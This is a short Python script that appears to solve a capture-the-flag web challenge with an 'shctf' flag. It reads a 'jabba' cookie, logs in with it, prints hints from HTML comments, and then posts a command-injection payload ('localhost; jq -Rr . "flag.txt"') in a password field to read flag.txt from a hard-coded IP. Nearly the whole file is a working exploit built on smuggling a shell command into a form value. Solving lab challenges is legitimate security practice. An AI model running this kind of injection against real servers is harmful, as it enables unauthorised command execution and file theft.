#!/usr/bin/env python3
import requests
import re

BASE_URL = "http://74.207.229.213:999"
HTML_COMMENT = re.compile(r"<!--(.*?)-->", re.DOTALL)

s = requests.Session()
s.headers.update(
    {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36",
    }
)

resp = s.get(BASE_URL)
cookie_value = resp.cookies["jabba"]

print("Logging in using the 'jabba' cookie value")
resp = s.post(BASE_URL + "/login", data={"destination": cookie_value})

comment = HTML_COMMENT.search(resp.text)
if comment:
    comment = comment.group(1).strip()
    print("Comment:")
    print(comment)

print("Sending test as password")
resp = s.post(BASE_URL + "/destination", data={"password": "test"})

comment = HTML_COMMENT.search(resp.text)
if comment:
    comment = comment.group(1).strip()
    print("Comment:")
    print(comment)

print("Sending command injection payload, using jq as hinted by the comment")
payload = 'localhost; jq -Rr . "flag.txt"'
resp = s.post(BASE_URL + "/destination", data={"password": payload})

flag = re.search(r"shctf{.*?}", resp.text)

if flag:
    print("Flag:", flag.group(0))
else:
    print("No flag found")
